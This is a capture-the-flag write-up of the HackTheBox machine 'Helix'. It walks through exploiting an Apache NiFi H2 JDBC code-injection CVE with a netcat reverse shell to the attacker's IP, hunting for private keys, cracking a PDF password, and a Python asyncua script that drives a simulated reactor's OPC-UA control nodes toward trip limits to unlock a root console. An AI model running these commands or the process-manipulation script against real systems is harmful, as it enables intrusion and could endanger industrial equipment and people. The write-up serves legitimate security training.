# Synopsis

**Helix** is a Medium difficulty Linux machine on HackTheBox set in an industrial automation and data processing environment. Initial enumeration reveals SSH, a web server, and an internally accessible **Apache NiFi** instance. Initial access is achieved by exploiting **[CVE-2023-34468](https://github.com/mbadanoiu/CVE-2023-34468/blob/main/Apache%20NiFi%20-%20CVE-2023-34468.pdf)**, a code injection vulnerability in Apache NiFi versions `0.0.2` through `1.21.0`: the `DBCPConnectionPool` and `HikariCPConnectionPool` connection services accept a database URL with the H2 driver without sufficient validation, allowing arbitrary Java code injection through H2 triggers (`CREATE TRIGGER ... AS $$//javascript java.lang.Runtime.getRuntime().exec(...)$$`). With valid credentials, a malicious controller service is created with a trap JDBC URL that, once activated, executes a reverse shell as the NiFi user. Once inside, enumeration reveals an **OPC-UA** server on `localhost:4840` (industrial protocol IEC 62541) managed by the `helixsvc` daemon. Privilege escalation is achieved by manipulating the OPC-UA server via the industrial automation protocol: `MAINTENANCE` mode is set with `TestOverride=True`, and the `CalibrationOffset` node is gradually increased to raise the simulated reactor's temperature and pressure values into the target window (`T≈296°C / P≈73.5 bar`). When the reactor enters that window, `helixsvc` (running as root) writes the file `/opt/helix/state/maintenance_window`, which enables access to the privileged command `sudo /usr/local/sbin/helix-maint-console`, granting a root shell.

## Skills Required

* Port and service enumeration (Nmap)
* Basic understanding of REST APIs and token-based (Bearer) authentication
* Familiarity with industrial protocols (OPC-UA)

## Skills Learned

* Exploiting Java code injection in Apache NiFi via a malicious H2 JDBC URL ([CVE-2023-34468](https://github.com/mbadanoiu/CVE-2023-34468/blob/main/Apache%20NiFi%20-%20CVE-2023-34468.pdf))
* Interacting with and browsing OPC-UA servers using `asyncua` (python-opcua)
* Manipulating OPC-UA nodes to alter industrial process parameters
* Privilege escalation via an industrial daemon's business logic (maintenance window as a trigger for sudo)
* Understanding SCADA/ICS systems and their attack surface

## Enumeration

I started by enumerating the machine with `nmap`:

```shell
sudo nmap -p- --open --min-rate 5000 -sS -Pn -sCV -n --disable-arp-ping --source-port 53 -oA target $IP
```

![Nmap Enumeration](writeups/htb/src/helix/Helix_enumeration_nmap.png)

Nmap detected the following open ports:

| Port | Service | Version                        | Notes                                              |
| ---- | ------- | ------------------------------- | ---------------------------------------------------- |
| 22   | SSH     | OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 | No credentials for now                                |
| 80   | HTTP    | nginx 1.18.0 (Ubuntu)            | Automatically redirects to the domain http://helix.htb. |

After identifying the redirect to **`helix.htb`**, I added the domain to the **`/etc/hosts`** file and continued enumerating the web service.

### Subdomain enumeration

Accessing the main domain `http://helix.htb`, I did a manual inspection of the site and reviewed its source code for useful information. Finding nothing relevant, I decided to continue with a deeper enumeration of the web service using specialized tools.

![Main Page](writeups/htb/src/helix/Helix_main.page.png)

```bash
ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://helix.htb -H "Host: FUZZ.hrlix.htb" -k -fc 301
```

![Subdomain Enumeration](writeups/htb/src/helix/Helix_enumeration_subdomain.png)

After running subdomain enumeration, I found the subdomain `flow`. I added it to `/etc/hosts` so it would resolve correctly and proceeded to access the site to inspect it and continue with enumeration.

![Subdomain Page](writeups/htb/src/helix/Helix_subdomain_page.png)

### Exploiting CVE-2023-34468

After inspecting the application and analyzing the technologies in use, I identified vulnerability **[CVE-2023-34468](https://github.com/mbadanoiu/CVE-2023-34468/blob/main/Apache%20NiFi%20-%20CVE-2023-34468.pdf)**, which affects **Apache NiFi** up to version **1.21.0**. This vulnerability allows an authenticated user with permissions to configure database connection services to use the **H2** driver to execute arbitrary code during JDBC connection initialization. Since the vulnerable instance was running an affected version and the necessary permissions were available, it was possible to leverage this flaw to achieve code execution on the server.

![CVE PoC Running 1](writeups/htb/src/helix/Helix_cve_poc_running1.png)
![CVE PoC Running 2](writeups/htb/src/helix/Helix_cve_poc_running2.png)

After analyzing the PoC and understanding how the vulnerability worked, I found a **[public exploit](https://github.com/imjdl/Apache-NiFi-Api-RCE/blob/master/exp.py)** on GitHub that automated much of the exploitation process. So I cloned the repository to use it during the following stages.

```bash
python exp.py http://flow.helix.htb/ "busybox nc <YOUR_IP> 5555 -e /bin/bash"
```

![Exploit CVE Revshell](writeups/htb/src/helix/Helix_exploit_cve_revshell.png)

### Lateral Movement

Once I gained access as **nifi**, I started the system enumeration phase. Inspecting the **`support-bundles`** directories, I found a backup file (`.bak`) storing the **SSH private key** of user **operator**. Thanks to this finding it was possible to reuse the key to establish an SSH connection and access as that user. The following command can also be used:

```bash
find /opt /etc /var -type f -readable -size +100c -size -10M -exec grep -Irl "BEGIN.*PRIVATE KEY" {} + 2>/dev/null
```

![SSH Private Key](writeups/htb/src/helix/Helix_ssh_private_key.png)

I copied the private key's content with `cat`, saved it to a file named **dev.key**, and set permissions to **600** so it could be used by the SSH client. I then authenticated as user **operator** using that key.

![Copy Private Key](writeups/htb/src/helix/Helix_copy_private_key.png)

```bash
ssh -i dev.key operator@localhost
```

![SSH Login Operator](writeups/htb/src/helix/Helix_ssh_login_operator.png)

With SSH access established as **`operator`**, it was now possible to read the file **`user.txt`** and obtain the machine's first **flag**.

![First Flag](writeups/htb/src/helix/Helix_first_flag.png)

## Privilege Escalation

After gaining access to the system as **operator**, I ran `sudo -l` to identify the privileges assigned to the user. The output showed it was possible to run **`/usr/local/sbin/helix-maint-console`** as **root** without a password (`NOPASSWD`). However, running it only showed the message **`Maintenance window CLOSED.`** and then exited, so I continued researching with this information in mind.

```bash
sudo -l
sudo /usr/local/sbin/helix-maint-console
```

![Sudo Permissions](writeups/htb/src/helix/Helix_sudo_perm.png)

While enumerating internal services, I identified several ports listening only on the local interface. Among them, **4840** especially caught my attention, since it corresponds to the default **OPC UA** port, indicating the presence of an internal service potentially interesting for continuing with privilege escalation.

```bash
ss -tulpn
```

![Operator Open Ports](writeups/htb/src/helix/Helix_operator_ss_open_ports.png)

As part of the enumeration, I listed **systemd** services and identified **`helix-plc.service`**, **`helix-hmi.service`**, and **`helix-safety.service`**, which indicated the system was composed of a **PLC**, an **HMI**, and a **Safety Controller**. Reviewing their configuration, I confirmed that **`helix-plc.service`** ran the **`helix-plc`** binary, responsible for the **OPC UA** service I had previously identified listening on port **4840**.

```bash
systemctl list-units --type=service --state=running | grep Helix
```

![Operator Services Enumeration](writeups/htb/src/helix/Helix_operator_enumeration_services.png)

I got a bit carried away enumerating and hadn't yet checked user **operator**'s home directory; there I found two files that caught my attention: **`control_systems_diagram.png`** and **`Operator Control & Safety Guide.pdf`**. Since both seemed to contain documentation related to the industrial environment, I proceeded to exfiltrate them to my machine to analyze them in more detail looking for information that could help with privilege escalation.

![Exfiltrate PDF](writeups/htb/src/helix/Helix_exfiltrate_pdf.png)

### Cracking the PDF hash

Once the file was exfiltrated, I noticed the PDF was password-protected. To recover it, I first extracted the hash with **`pdf2john`** and then ran **John the Ripper** using the **`rockyou.txt`** wordlist, managing to obtain the password needed to open the document.

```bash
pdf2john Operator.pdf> pdf.hash

john --wordlist=/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt pdf.hash
```

![Crack John PDF](writeups/htb/src/helix/Helix_crack_john_pdf.png)

Once I recovered the password, I opened the PDF and confirmed it was the system's **operation and safety manual**. Among the content, a section dedicated to **Maintenance Mode** stood out, describing the steps required to enable the maintenance window. The document stated it was necessary to change the mode to **`MAINTENANCE`**, enable the **`TestOverride`** option, and make adjustments via **`CalibrationOffset`** — information that turned out to be key to understanding how the previously found maintenance console worked.

![Operator PDF](writeups/htb/src/helix/Helix_operator_pdf.png)

### Discovering the OPC UA endpoint

Before continuing with the service analysis, I recommend doing **port forwarding** via **SSH** to access the internal service from the attacking machine and work more comfortably with the analysis tools. For this, you need the **SSH private key** of user **operator**, obtained in the previous phase, since it will be used to establish the tunnel to the internal port.

```bash
ssh -i dev.key -L 4840:127.0.0.1:4840 operator@helix.htb
```

![SSH Forwarding](writeups/htb/src/helix/Helix_ssh_fordwarding.png)

Since I had already identified that the service corresponded to an **OPC UA** server, I established a connection using the **`opc.tcp://`** scheme to start its enumeration. As a result, the endpoint **`opc.tcp://127.0.0.1:4840/helix/`** was identified, confirming that the OPC UA service was available and ready to continue the analysis.

```python
from asyncua import Client
import asyncio

async def main():
    client = Client("opc.tcp://127.0.0.1:4840")
    endpoints = await client.connect_and_get_server_endpoints()

    for ep in endpoints:
        print(ep.EndpointUrl)

asyncio.run(main())
```

![OPC Enumeration](writeups/htb/src/helix/Helix_enumeration_OPC.png)

Since the manual indicated that it was necessary to set **`Mode`** to **`MAINTENANCE`**, enable **`TestOverride`**, and modify **`CalibrationOffset`**, the next step was to enumerate all the nodes exposed by the **OPC UA** server. This enumeration allowed identifying the full address space structure and obtaining the **NodeId** associated with each variable. Comparing these results with the previously obtained documentation confirmed the existence of the **`Mode`**, **`TestOverride`**, and **`CalibrationOffset`** nodes, exactly as described in the manual, which allowed connecting the documentation to the service and continuing the analysis.

```python
import asyncio
from asyncua import Client
URL = "opc.tcp://127.0.0.1:4840/helix/"
async def main():
    async with Client(URL) as client:
        print("[+] Connected")
        objects = client.nodes.objects
        children = await objects.get_children()
        print(f"[+] Objects ({len(children)} children)\n")
        for child in children:
            try:
                bn = await child.read_browse_name()
                print(f"{bn.Name:30} {child.nodeid}")
            except Exception as e:
                print(e)

asyncio.run(main())
```

```python
import asyncio
from asyncua import Client
URL = "opc.tcp://127.0.0.1:4840/helix/"
async def browse(node, level=0):
    try:
        bn = await node.read_browse_name()
        print("  " * level + f"{bn.Name} ({node.nodeid})")
        for child in await node.get_children():
            await browse(child, level + 1)
    except Exception as e:
        print("  " * level + f"ERROR: {e}")
async def main():
    async with Client(URL) as client:
        print("[+] Connected")
        plant = client.get_node("ns=2;i=1")
        await browse(plant)
asyncio.run(main())
```

![OPC Important Data Enumeration](writeups/htb/src/helix/Helix_enumeration_OPC_important_data.png)

### Automating the maintenance window

Once the **NodeId**s were identified and the system's behavior was understood thanks to the documentation obtained, I ran a **Python** script using the **`asyncua`** library to interact with the **OPC UA** server. The script established the connection to the endpoint **`opc.tcp://127.0.0.1:4840/helix/`**, read the reactor's variable states, and automated writing to the **`Mode`**, **`TestOverride`**, and **`CalibrationOffset`** nodes. It also continuously monitored the system's temperature, pressure, and safety status to keep the reactor within the maintenance window described in the manual, subsequently allowing the **`helix-maint-console`** to be used under the required conditions.

```python3
#!/usr/bin/env python3
import asyncio
from asyncua import Client, ua

URL = "opc.tcp://127.0.0.1:4840/helix/"

# Node IDs from browse output
N_TEMP     = "ns=2;i=4"    # Plant.Reactor.Temperature       (Double, read)
N_PRESS    = "ns=2;i=5"    # Plant.Reactor.Pressure          (Double, read)
N_OFFSET   = "ns=2;i=6"    # Plant.Reactor.CalibrationOffset (Double, write)
N_TRIP     = "ns=2;i=10"   # Plant.Safety.TripActive         (Bool,   read)
N_MODE     = "ns=2;i=12"   # Plant.Control.Mode              (String, write)
N_OVERRIDE = "ns=2;i=13"   # Plant.Control.TestOverride      (Bool,   write)
N_RESET    = "ns=2;i=14"   # Plant.Control.ResetTrip         (Bool,   write)

# Targets — window opens at T≈295 or P≈73; trip at 305 / 75
TARGET_T = 296.0
TARGET_P = 73.5
TRIP_T   = 303.5   # back off well before 305
TRIP_P   = 74.5
STEP     = 0.25    # offset increment per tick — stay small, simulator dynamics lag
SETTLE   = 1.5     # seconds between writes; let temp/press catch up

async def w(c, nid, val, vtype):
    await c.get_node(nid).write_value(ua.DataValue(ua.Variant(val, vtype)))

async def r(c, nid):
    return await c.get_node(nid).read_value()

async def main():
    async with Client(url=URL) as c:
        t = await r(c, N_TEMP); p = await r(c, N_PRESS); off = await r(c, N_OFFSET)
        print(f"[i] start  T={t:.2f}  P={p:.2f}  offset={off:.2f}")

        # 1) Enter maintenance
        await w(c, N_MODE,     "MAINTENANCE", ua.VariantType.String)
        await w(c, N_OVERRIDE, True,          ua.VariantType.Boolean)
        print("[+] Mode=MAINTENANCE, TestOverride=True")
        await asyncio.sleep(1)

        # 2) Ramp offset until we're inside the window
        offset = float(off)
        while True:
            t    = await r(c, N_TEMP)
            p    = await r(c, N_PRESS)
            trip = await r(c, N_TRIP)
            print(f"  off={offset:5.2f}  T={t:7.3f}  P={p:6.3f}  trip={trip}")

            if trip:
                print("[-] TRIPPED — run recovery (see comment block below)")
                return

            if t >= TARGET_T or p >= TARGET_P:
                print(f"[+] INSIDE WINDOW (T={t:.2f} P={p:.2f}) — "
                      f"SWITCH TO OPERATOR SHELL AND RUN:\n"
                      f"    sudo /usr/local/sbin/helix-maint-console")
                break

            # adaptive step: shrink as we close in on trip thresholds
            head_t = TRIP_T - t
            head_p = TRIP_P - p
            step = STEP
            if head_t < 4 or head_p < 1.5: step = STEP / 2
            if head_t < 2 or head_p < 0.8: step = STEP / 4

            offset += step
            await w(c, N_OFFSET, offset, ua.VariantType.Double)
            await asyncio.sleep(SETTLE)

        # 3) HOLD the reactor in-window so the helixsvc daemon keeps refreshing
        #    /opt/helix/state/maintenance_window while you get root + persist.
        print("[i] Holding in-window. Ctrl-C after you've dropped SUID bash.")
        while True:
            await asyncio.sleep(3)
            t    = await r(c, N_TEMP)
            p    = await r(c, N_PRESS)
            trip = await r(c, N_TRIP)
            print(f"  [hold] T={t:.2f}  P={p:.2f}  trip={trip}  off={offset:.2f}")
            if trip:
                print("[-] tripped mid-hold; bail"); break
            # gentle correction if drifting out of window
            if t < 295.5 and p < 73.2:
                offset += 0.15
                await w(c, N_OFFSET, offset, ua.VariantType.Double)
            elif t > TRIP_T - 2 or p > TRIP_P - 0.6:
                offset -= 0.15
                await w(c, N_OFFSET, offset, ua.VariantType.Double)

# --- Recovery (paste into a python REPL if you trip) ---
# async with Client(url=URL) as c:
#     await w(c, N_OFFSET,   0.0,       ua.VariantType.Double)
#     await w(c, N_OVERRIDE, False,     ua.VariantType.Boolean)
#     await w(c, N_MODE,     "NORMAL",  ua.VariantType.String)
#     # wait for T<288, P<70, then:
#     await w(c, N_RESET,    True,      ua.VariantType.Boolean)

asyncio.run(main())
```

![Exploit Root](writeups/htb/src/helix/Helix_exploit_root.png)

After running the script and keeping the system within the maintenance window, I ran the **`/usr/local/sbin/helix-maint-console`** binary again, previously identified with `sudo -l`, since the conditions required for it to work were now satisfied.

```bash
sudo -l
sudo /usr/local/sbin/helix-maint-console
```

![Privilege Escalation](writeups/htb/src/helix/Helix_privilege_scalation.png)

This time, the utility granted access to the maintenance console with **root** privileges, completing the privilege escalation and allowing access to the file **`/root/root.txt`**.

![Root Flag](writeups/htb/src/helix/Helix_root_flag.png)